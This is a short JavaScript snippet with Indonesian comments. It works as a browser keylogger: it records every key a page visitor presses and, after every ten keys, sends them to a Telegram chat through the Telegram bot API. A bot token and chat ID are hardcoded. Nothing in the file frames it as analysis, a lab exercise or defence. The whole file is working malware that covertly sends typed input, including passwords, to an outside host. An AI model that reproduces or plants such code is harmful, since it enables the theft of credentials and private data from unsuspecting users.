let keys = [];
document.addEventListener("keydown", function(event) {
    keys.push(event.key);
    if (keys.length >= 10) {  // Kirim setelah 10 tombol ditekan
        let message = "Keys: " + keys.join("");
        let botToken = "bot6592357228:AAEFYVLiyqAwhxMrgP37B2h9MAO8U2OOLTQ";
        let chatId = "-4811466610";
        let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
        .then(response => console.log("Sent:", message))
        .catch(error => console.error("Error:", error));

        keys = [];  // Reset setelah mengirim
    }
});
